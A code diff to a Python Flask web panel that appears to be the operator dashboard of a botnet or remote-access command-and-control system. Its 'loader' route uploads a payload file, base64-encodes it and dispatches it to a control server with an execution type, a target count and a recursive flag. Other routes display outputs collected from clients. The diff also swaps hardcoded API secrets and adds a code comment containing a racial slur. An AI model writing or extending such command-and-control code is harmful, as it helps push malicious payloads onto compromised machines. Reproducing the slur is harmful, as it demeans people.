@@ -11,6 +11,11 @@ import base64
 import time
 import magic
 
+
+# Add pending commands list on individual client
+# Fix individual not working
+# Add authentication
+
 def convert_to_ago(timestamp):
     def add0(intInput):
         intInput = str(intInput)
@@ -53,7 +58,7 @@ def convert_to_future(timestamp):
 
 
 SERVER_ADDRESS = "http://127.0.0.1:9999"
-API_SECRET = "dj)!gf0CN eIX)#!e9jxm)SAh0btpmr"
+API_SECRET = "d102rf1q2-tgfv0ervjm_wj-d12D0-VNBNH-6HJW5N-R"
 HOST,PORT = "127.0.0.1", 6767
 GUEST_KEY = "djfop1jf1pgj1-f2j-12gj01-2g"
 
@@ -156,6 +161,7 @@ def loader():
     if request.method == "POST":
 
         file = request.files['payload']
+
         execution_type = request.form.get('execution_type').split("|")[1][1:]
         payload = base64.b64encode(file.read()).decode("utf-8")
     
@@ -178,7 +184,7 @@ def loader():
             json={
                 "api_secret": API_SECRET,
                 "cmd_type": execution_type,
-                "cmd_args": payload,
+                "cmd_args": [payload, request.form.get("argument")], # nigga here 
                 "amount": int(amount),
                 "note": note,
                 "is_recursive": is_recursive
@@ -259,7 +265,7 @@ def server_logs():
     new_outputs_list.sort(key=lambda x: x["time_recieved"], reverse=True)
     return render_template("server_logs.html", new_outputs_list=new_outputs_list)
 
-@app.route("/individual")
+@app.route("/individual", methods=['GET', 'POST'])
 def individual():
 
     response = httpx.post(SERVER_ADDRESS + "/api/get_output", 
